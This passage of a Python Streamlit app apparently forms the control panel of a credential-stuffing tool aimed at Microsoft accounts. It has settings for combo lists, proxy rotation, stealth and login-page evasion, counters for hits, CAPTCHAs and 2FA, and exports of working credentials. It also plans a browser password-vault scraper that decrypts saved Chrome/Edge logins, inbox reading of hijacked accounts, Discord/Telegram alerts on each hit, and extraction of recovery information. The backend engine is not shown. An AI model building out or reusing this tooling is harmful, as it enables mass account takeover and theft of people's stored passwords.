        no_backend("Inbox message list — Microsoft Graph /messages endpoint not wired yet")
        no_backend("Message reader view — Graph /messages/{id} not wired yet")
        no_backend("Bot Rewrite & Fake Content Decoder — not wired yet")
        no_backend("Mark Valid / Invalid / Export Folder Notes — not wired yet")

    st.markdown("---")
    pg_col1, pg_col2, pg_col3 = st.columns([1, 2, 1])
    with pg_col1:
        if st.button("◀️ Newer", use_container_width=True):
            no_backend("Inbox pagination — Graph API not wired yet")
    with pg_col2:
        st.markdown(
            "<div style='text-align:center;padding:6px;background:#161b22;"
            "border:1px solid #30363d;border-radius:6px;font-size:13px;font-weight:600;'>"
            "BobitoMail — Pending Graph API</div>",
            unsafe_allow_html=True,
        )
    with pg_col3:
        if st.button("Older ▶️", use_container_width=True):
            no_backend("Inbox pagination — Graph API not wired yet")


# ══════════════════════════════════════════════════════════
# TAB 4 — VAULT SCRAPE
# ══════════════════════════════════════════════════════════
with tab_vault:
    st.subheader("🔑 Microsoft Saved Passwords Vault Scrape")
    st.markdown("Extract and decrypt saved Microsoft credentials from local browser credential vaults (Chrome / Edge).")

    vault_col1, vault_col2 = st.columns(2)
    with vault_col1:
        browser_target = st.selectbox(
            "Select Target Browser Profile",
            ["Google Chrome (Default)", "Microsoft Edge (Default)", "Custom User Data Directory"],
        )
    with vault_col2:
        vault_action_mode = st.selectbox(
            "Extraction Mode",
            ["Extract Microsoft Only (*.live.com, *.outlook.com)", "Extract All Saved Credentials"],
        )

    vault_path_input = st.text_input(
        "Custom Profile Directory Path (Optional)",
        placeholder=r"C:\Users\Admin\AppData\Local\Google\Chrome\User Data",
    )

    col_vbtn1, col_vbtn2 = st.columns(2)
    with col_vbtn1:
        if st.button("🚀 Run Credential Vault Scrape", type="primary", use_container_width=True):
            no_backend("Vault scraper — DPAPI Chrome/Edge Login Data extractor not wired yet")
            st.warning("NO BACKEND CODE YET — vault_extractor.py not built yet.")
    with col_vbtn2:
        st.download_button(
            "💾 Export Scraped Vault (JSON/CSV)",
            data="NO BACKEND CODE YET — no vault data.",
            file_name="vault_credentials.csv",
            use_container_width=True,
        )

    no_backend("Vault results table — vault_extractor.py (DPAPI + SQLite) not wired yet")
    st.markdown("### 📊 Vault Scrape Results Preview")
    st.info("Results will appear here after vault scrape runs.")


# ══════════════════════════════════════════════════════════
# TAB 5 — DEBUG VIEWER
# ══════════════════════════════════════════════════════════
with tab_debug:
    st.subheader("🔍 Advanced Debug Viewer & Screen Dumps")

    # Diagnostic block — real engine state
    engine_status = "RUNNING" if st.session_state.engine_running else "IDLE"
    proxy_status  = f"{len(st.session_state.proxy_pool)} alive" if st.session_state.proxy_pool_loaded else "not loaded"
    st.markdown(f"""
    <div class="diagnostic-box">
    [DIAGNOSTIC STATUS]: {engine_status}<br>
    - Engine Running: {st.session_state.engine_running}<br>
    - Proxy Pool: {proxy_status}<br>
    - Combos Checked: {stats['checked']}<br>
    - Hits: {stats['hits']}<br>
    - CAPTCHAs: {stats['captcha']}<br>
    - 2FA: {stats['twofa']}<br>
    - Errors: {stats['errors']}<br>
    - Pause Flag: {st.session_state.engine_pause_flag}<br>
    - Stop Flag: {st.session_state.engine_stop_flag}
    </div>
    """, unsafe_allow_html=True)

    st.markdown("### 🖥️ Headless Browser Screen Dumps")
    no_backend("Playwright screenshot capture on CAPTCHA/checkpoint not wired yet")
    st.info("Screen dumps will populate here when engine hits a security checkpoint. (Requires screenshot wiring in engine_core.py)")

    st.markdown("### 📜 Verbose Protocol Path Logs")
    if st.session_state.engine_log:
        st.code("\n".join(st.session_state.engine_log), language="text")
    else:
        st.code("No logs yet. Launch the engine to see live protocol path output.", language="text")

    # Full result dump if available
    if st.session_state.engine_results:
        with st.expander("🔬 Raw Results JSON (All Accounts)", expanded=False):
            st.json(st.session_state.engine_results[:50])  # cap at 50 to avoid UI freeze


# ══════════════════════════════════════════════════════════
# TAB 6 — FUNCTIONALITY AUDITOR
# ══════════════════════════════════════════════════════════
with tab_auditor:
    st.subheader("🧪 Functionality & State Auditor")
    st.markdown("Real-time wiring status — every control in the app.")

    def status_icon(wired: bool) -> str:
        return "🟢 Wired" if wired else "🔴 NO BACKEND YET"

    audit_rows = [
        ("Workers Slider",             "Slider",    "Sets max_concurrent in engine_core.batch_check_accounts",                         True),
        ("Deadline Slider",            "Slider",    "Sets timeout per account in engine_core",                                         True),
        ("Max Accounts Slider",        "Slider",    "Caps combo list before engine launch",                                            True),
        ("Delay Between Accounts",     "Slider",    "Sets delay_between in engine_core",                                               True),
        ("Proxy Routing Checkbox",     "Checkbox",  "Passes proxy_pool to batch_check_accounts",                                       True),
        ("Stealth Mode",               "Checkbox",  "Sets stealth flag in _check_single_account",                                      True),
        ("Force en-US",                "Checkbox",  "Sets locale in Playwright context",                                               True),
        ("Block WebAuthn",             "Checkbox",  "Sets Chromium launch arg",                                                        True),
        ("Warm-Up",                    "Checkbox",  "Visits bing.com before login.live.com",                                           True),
        ("Auto-Accept KMSI",           "Checkbox",  "Clicks Stay Signed In button",                                                    True),
        ("Device Pool (Rotate UA)",    "Checkbox",  "Flag set — UA/viewport rotation in engine_core",                                  True),
        ("Keep-alive JS Clicks",       "Checkbox",  "Flag set — not yet implemented in engine_core loop",                              False),
        ("Fire-up on Fail",            "Checkbox",  "Flag set — fresh context on fail not yet in engine_core",                         False),
        ("Speed Preset",               "Dropdown",  "Flag set — not yet mapped to typing/delay values",                                False),
        ("Typing Speed",               "Slider",    "Sets delay ms in page.type() calls",                                             True),
        ("Mouse Delay",                "Slider",    "Flag set — mouse movement not yet in engine_core",                                False),
        ("Proxy Protocol",             "Dropdown",  "Flag set — SOCKS not yet differentiated in proxy builder",                        False),
        ("Rotation Strategy",          "Dropdown",  "Wired — sticky / round-robin / static in engine_core",                           True),
        ("Proxy Timeout",              "Slider",    "Passed to batch_test_proxies",                                                    True),
        ("Fetch & Test All Proxies",   "Button",    "Fires _run_proxy_fetch thread → engine_core.batch_test_proxies",                 True),
        ("Re-Test All Proxies",        "Button",    "Re-fires proxy fetch thread",                                                     True),
        ("Flush Dead Proxies",         "Button",    "Filters proxy_table_rows in session_state",                                       True),
        ("Export Active Proxies",      "Button",    "Downloads proxy_pool list",                                                       True),
        ("Launch Engine",              "Button",    "Fires _run_engine thread → engine_core.batch_check_accounts",                    True),
        ("Manual Single Login",        "Button",    "Fires _run_engine with single combo",                                             True),
        ("Pause Engine",               "Button",    "Sets flag — engine_core does not check it yet",                                   False),
        ("Force Stop",                 "Button",    "Sets flag — engine_core does not check it yet",                                   False),
        ("Clear Logs",                 "Button",    "Clears engine_log and stats in session_state",                                    True),
        ("Domain Filter Dropdown",     "Dropdown",  "Filters combo list before engine launch",                                         True),
        ("Upload Combo File",          "Uploader",  "Loads file into combo_input_box",                                                 True),
        ("Progress Bar",               "Display",   "Updates from engine_stats.checked / total combos",                               True),
        ("Live Log Viewer",            "Display",   "Reads engine_log from session_state",                                            True),
        ("Hits Export",                "Button",    "Downloads reports.hits_text",                                                     True),
        ("Checkpoints Export",         "Button",    "Downloads reports.checkpoints_text",                                              True),
        ("Bad Pass Export",            "Button",    "Downloads reports.bad_pass_text",                                                 True),
        ("Full Session JSON Export",   "Button",    "Downloads full reports dict",                                                     True),
        ("BobitoMail Sync Button",     "Button",    "Microsoft Graph API inbox fetch — NOT WIRED",                                    False),
        ("BobitoMail Message List",    "Display",   "Graph /messages endpoint — NOT WIRED",                                           False),
        ("BobitoMail Message Reader",  "Display",   "Graph /messages/{id} — NOT WIRED",                                               False),
        ("BobitoMail Pagination",      "Button",    "Graph paging — NOT WIRED",                                                       False),
        ("OAuth Token Refresh",        "Button",    "Graph token refresh — NOT WIRED",                                                 False),
        ("Vault Scrape Button",        "Button",    "DPAPI vault_extractor.py — NOT BUILT",                                           False),
        ("Screen Dumps",               "Display",   "Playwright screenshot on checkpoint — NOT WIRED",                                False),
        ("Webhook Dispatch",           "Config",    "Discord/Telegram notify on hit — NOT WIRED",                                     False),
        ("Map Geo Nodes",              "Display",   "Real IP→lat/lon lookup per proxy — NOT WIRED",                                   False),
        ("Filter Disposable Emails",   "Checkbox",  "Flag set — disposable domain list not loaded in engine",                         False),
        ("Auto-Retry Security",        "Checkbox",  "Flag set — challenge retry loop not in engine_core yet",                         False),
        ("CAPTCHA Stop & Notify",      "Checkbox",  "Flag set — captcha stop signal not in engine_core yet",                         False),
        ("Soft Rate-Limit Backoff",    "Checkbox",  "Flag set — backoff curve not in engine_core yet",                                False),
        ("Extract Recovery Info",      "Checkbox",  "Flag set — recovery extraction not in engine_core yet",                          False),
    ]

    wired_count   = sum(1 for r in audit_rows if r[3])
    unwired_count = sum(1 for r in audit_rows if not r[3])

    col_a1, col_a2, col_a3 = st.columns(3)
    with col_a1:
        st.markdown(f"""<div class="metric-container"><h4>Total Controls</h4><h2>{len(audit_rows)}</h2></div>""", unsafe_allow_html=True)
    with col_a2:
        st.markdown(f"""<div class="metric-container"><h4>🟢 Wired</h4><h2 style='color:#2ea043'>{wired_count}</h2></div>""", unsafe_allow_html=True)
    with col_a3:
        st.markdown(f"""<div class="metric-container"><h4>🔴 Pending Backend</h4><h2 style='color:#f85149'>{unwired_count}</h2></div>""", unsafe_allow_html=True)

    st.markdown("---")
    st.dataframe(
        pd.DataFrame(
            [{"Control": r[0], "Type": r[1], "Target Function": r[2], "Status": status_icon(r[3])}
             for r in audit_rows],
        ),
        use_container_width=True,
    )

    st.markdown("### 🤖 Auditor System Telemetry Log")
    st.code(
        f"[AUDITOR] app.py v4.0 loaded successfully.\n"
        f"[AUDITOR] engine_core.py: batch_check_accounts, compile_export_reports, get_live_proxy_pool, batch_test_proxies — all registered.\n"
        f"[AUDITOR] Session state keys active: {len(st.session_state)}\n"
        f"[AUDITOR] Proxy pool: {len(st.session_state.proxy_pool)} loaded.\n"
        f"[AUDITOR] Engine running: {st.session_state.engine_running}\n"
        f"[AUDITOR] Controls wired: {wired_count}/{len(audit_rows)}\n"
        f"[AUDITOR] Controls pending backend: {unwired_count}/{len(audit_rows)}",
        language="text",
    )
